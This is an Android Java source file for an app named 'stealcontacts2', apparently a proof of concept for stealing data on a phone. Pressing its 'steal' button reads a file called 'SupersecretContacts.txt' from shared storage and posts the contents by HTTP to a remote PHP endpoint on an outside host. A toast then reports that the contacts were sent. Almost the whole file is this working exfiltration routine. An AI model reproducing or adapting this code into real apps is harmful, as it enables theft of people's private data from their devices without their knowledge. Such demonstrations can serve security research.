/*
Copyright 2010 Kieran Levin


    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.
*/
package com.kieranlevin.stealcontacts2;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.util.*;

import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;

import android.app.Activity;
import android.os.Bundle;
import android.widget.Button;
import android.os.Environment;
import android.view.View.OnClickListener;
import android.content.Context;
import android.view.View;
import android.app.ProgressDialog;

import android.media.ExifInterface;
import android.widget.Toast;


public class stealcontacts2 extends Activity {
    /** Called when the activity is first created. */
    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);
        
        Button stealdata = (Button)findViewById(R.id.steal);
        // Register the onClick listener with the implementation above
        stealdata.setOnClickListener(mAddsteal);
        
        // Capture our button from layout
        Button exit = (Button)findViewById(R.id.exit);
        // Register the onClick listener with the implementation above
        exit.setOnClickListener(mAddexit);
    }
    // Create an anonymous implementation of OnClickListener
    private OnClickListener mAddsteal = new OnClickListener()
    {
    	public void onClick(View v)
    	{

    		// do something when the button is clicked 
    		try
    		{
    			ProgressDialog dialog = ProgressDialog.show(stealcontacts2.this, "", 
                        "Stealing. Please wait...", true);
    			Senddatatoserver();
    			dialog.setProgress(1000);
    			dialog.dismiss();
    		}
    		catch (Exception ex)
    		{
      		   ex.printStackTrace();

    		}
    	}
    };
    private OnClickListener mAddexit = new OnClickListener()
    {
    	public void onClick(View v)
    	{
    		// exit when the button is clicked
    		try
    		{
    			finish();
    		}
    		catch (Exception ex)
    		{

    		}
    	}
    };
    
    private void Senddatatoserver()
    {
    	String contactdata = "";
        File path = Environment.getExternalStoragePublicDirectory(
                Environment.DIRECTORY_PICTURES);
        try {  
        	byte [] contactarray = new byte[11024]; 
			ExifInterface exif = new ExifInterface(path.getPath() +  "/DemoPicture.jpg");
			contactdata = exif.getAttribute(ExifInterface.TAG_MODEL);
    		FileInputStream f = new FileInputStream(new File(path.getPath(), "SupersecretContacts.txt"));
    		f.read(contactarray,0, contactarray.length);
    		f.close();
    		contactdata = new String(contactarray);
	    	//send this contactdata to the server
	    	HttpClient httpclient = new DefaultHttpClient();  
	    	HttpPost httppost = new HttpPost("http://kieranlevin.com/scontacts/steal.php");    
    	
    	    // Add your data  
    	    List<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>(2);  
    	    nameValuePairs.add(new BasicNameValuePair("contacts", contactdata));
    	    httppost.setEntity(new UrlEncodedFormEntity(nameValuePairs));  
    	  
    	    // Execute HTTP Post Request  
    	    HttpResponse response = httpclient.execute(httppost);  
    	    
    		Context context = getApplicationContext();
    		CharSequence text = "Success - Sent contacts to server ";
    		int duration = Toast.LENGTH_LONG;
    		Toast toast = Toast.makeText(context, text, duration);
    		toast.show();
    	      
    	} catch (ClientProtocolException e) {  
    	    // TODO Auto-generated catch block  
    	} catch (IOException e) {  
    		Context context = getApplicationContext();
    		CharSequence text = e.toString() + " Failed to connect to server ";
    		int duration = Toast.LENGTH_LONG;
    		Toast toast = Toast.makeText(context, text, duration);
    		toast.show();
    	    // TODO Auto-generated catch block  
    	}  
    	
    	
    	
    	
    }
    
}



